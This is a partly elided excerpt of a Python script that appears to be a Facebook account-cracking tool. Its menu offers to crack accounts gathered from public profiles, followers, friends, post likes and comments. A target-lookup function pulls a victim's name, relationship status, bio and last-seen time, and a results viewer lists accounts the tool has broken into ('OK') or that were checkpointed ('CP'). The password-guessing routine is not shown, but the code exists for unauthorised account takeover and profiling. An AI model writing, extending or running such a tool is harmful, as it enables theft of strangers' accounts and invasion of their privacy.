...
def bot():
	try:
		...
		time.sleep(0.5)
		login()
	komentar = random.choice(["ALI RAZA//PAKISTAN ZINDA ABAD "])
	komen = random.choice(["PROUD TO BE MUSLIM"])
...
def menu():
	...
	emil(p+" Tanggal    : "+hck)
	emil(ris)
	emil(u+" ["+m+"o1"+u+"]"+p+" Crack From Random Public Account")
	emil(u+" ["+m+"o2"+u+"]"+p+" Crack Crack From Followers Account")
	emil(u+" ["+m+"o3"+u+"]"+p+" Crack Accounts From Mass Public")
	emil(u+" ["+m+"o4"+u+"]"+p+" Crack From Friends Account")
	emil(u+" ["+m+"o5"+u+"]"+p+" Crack Old Accounts 2004/2008")
	emil(u+" ["+m+"o6"+u+"]"+p+" Crack Old Accounts 2004/2010")
	emil(u+" ["+m+"o7"+u+"]"+p+" Crack Accounts From Post Likes")
	emil(u+" ["+m+"o8"+u+"]"+p+" Crack Accounts From Post Comments")
...
def Author():
	emil(u+"\n ["+m+"o1"+u+"]"+p+" CONTACT ME ON WP")
	emil(u+" ["+m+"o2"+u+"]"+p+" PROUD TO BE MUSLIM")
	emil(u+" ["+m+"o3"+u+"]"+p+" PROUD TO BE PAKISTANI")
	emil(u+" ["+m+"o4"+u+"]"+p+" Lapor BUG ")
	abang = input(ris+"\n"+mx+p+" Pilih :"+m+" ")
	if abang=="1" or abang=="01":
		os.system("xdg-open 03047269778")
	elif abang=="2" or abang=="02":
		os.system("xdg-open Keep enjoying")
	elif abang=="3" or abang=="03":
		os.system("xdg-open https://www.facebook.com/abukalinkcopykarlia")
	elif abang=="4" or abang=="04":
		os.system("xdg-open CHLO SHORO KARAIN")
	else :
...
def Target():
        try:
                ...
                time.sleep(0.5)
                login()
        uid=input(mx+p+" Put id Target : "+b)
        try:
...
def GetData():
    try:
        ...
        jalan(mx+k+" Token Expired")
        login()
    try:
        user = input (balmond+p+" Id Target : ")
        if user == '':
            jalan (balmond+m+" Enter the correct id Tod-_");GetData()
        ...
        nmaa = ('-')
    print (ris)
    jalan (b+"   Account Information ")
    jala (mx+p+' Full Name : '+nmaa)
    try:
        ndpn = x['first_name']
    ...
    try:
        try:
            ...
            stas = 'Single'
        try:
            dgn = """ With """+x['significant_other']['name']
        except (TypeError,KeyError,IOError):
            dgn = ' '
        except:
            pass
        jala (mx+p+' status Connection: '+stas+dgn)
    except:
        pass
    try:
        bioo = x['about']
    ...
    try:
        ...
        pass
    jalan(mx+" Last Online Date \x1b[1;97m"+uptd+"\x1b[1;95m Jam \x1b[1;97m"+jam)
    emil(ris)
    input(u+'\n  [ '+p+'Return '+u+'] ')
    menu()
...
def tema():
	emil_lope_usup(u+"\n ["+m+"o1"+u+"]"+p+" Theme Default "+u+"("+p+"Biasa"+u+")")
	emil_lope_usup(u+" ["+m+"o2"+u+"]"+p+" Theme Yellow"+u+"("+k+"Tai"+u+")")
	emil_lope_usup(u+" ["+m+"o3"+u+"]"+p+" Red "+u+"("+m+"Amarah"+u+")")
	emil_lope_usup(u+" ["+m+"o4"+u+"]"+p+"  Blue "+u+"("+b+"Langit"+u+")")
	emil_lope_usup(u+" ["+m+"o5"+u+"]"+p+"  Rainbow "+u+"("+m+"P"+k+"e"+h+"l"+b+"a"+u+"n"+s+"g"+k+"i"+u+")")
	emil_lope_usup(u+" ["+m+"o0"+u+"]"+p+" Return")
	sayang_emil = input("\n"+balmond+p+" Pilih :"+m+" ")
	if sayang_emil=="1" or sayang_emil=="01":
		awm = open(".tema.txt","w");awm.write("default");awm.close()
		print ("\n"+balmond+p+" Theme Successfully Apply")
		jalan(balmond+p+" Return The Script...")
		time.sleep(0.5)
		exit()
...
def result():
	emil_cantik = 000
	hacil = 1
	emil(u+"\n ["+m+"o1"+u+"]"+l+" Cek Result CP "+u+"("+k+"akun sesi"+u+")")
	emil(u+" ["+m+"o2"+u+"]"+l+" Cek Result OK "+u+"("+h+"akun terbuka"+u+")")
	emil(u+" ["+m+"o0"+u+"]"+l+" Kembali")
	pilih = input(ris+"\n"+balmond+l+" Pilih : "+m)
	if pilih=="1" or pilih=="01":
		try:
			emill = os.listdir("Result/Cp")
		except FileNotFoundError:
			jalan(balmond+m+" You haven't hacked yet Tod-_")
			time.sleep(0.5)
			menu()
		if len(emill)==0:
			emil("\n"+balmond+k+" Result CP")
			emil_lope_usup(balmond+m+" Gada Result Cp")
			input(balmond+l+" Return")
			time.sleep(0.5)
			menu()
		else:
			emil("\n"+balmond+l+" Result "+k+"CP \n")
			for jisoo in emill:
			...
			try:
				binatang = open("Result/Cp/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" File Name Missing")
				time.sleep(0.5)
				menu()
		print(""+l)
		bapakbapak = open("Result/Cp/"+marjan,"r").readlines()
		for cuyung in bapakbapak:
			emil_cantik += 1
			emil ("\r"+u+" ["+b+f"{emil_cantik}"+u+"] "+p+cuyung,end=" ")
			time.sleep(0.1)
		emil(ris)
		emil_lope_usup(mx+p+" Amount Result "+k+"Cp"+p+" :"+b+" %s Akun"%len(bapakbapak))
		emil("\n"+ris)
